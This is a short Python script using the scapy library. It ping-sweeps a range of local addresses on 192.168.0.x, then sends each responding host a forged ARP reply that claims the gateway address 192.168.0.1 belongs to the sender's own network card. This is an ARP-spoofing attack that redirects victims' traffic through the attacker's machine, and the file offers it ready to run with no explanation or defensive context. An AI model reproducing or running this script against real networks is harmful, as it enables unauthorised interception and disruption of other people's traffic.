

#!/usr/bin/env python


import logging
import subprocess


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

from scapy.all import *



ans, unans = sr(IP(dst = "192.168.0.2-25") / ICMP(), timeout = 2, iface = "eth0", verbose = 0)


reachable = []




for reply in ans:
        reachable.append(reply[1][IP].src)

for host in reachable:

        send(ARP(hwsrc = get_if_hwaddr("eth0"), psrc = "192.168.0.1", hwdst = "ff:ff:ff:ff:ff:ff", pdst = host), iface = "eth0", verbose = 0)

print "\nDone!\n"




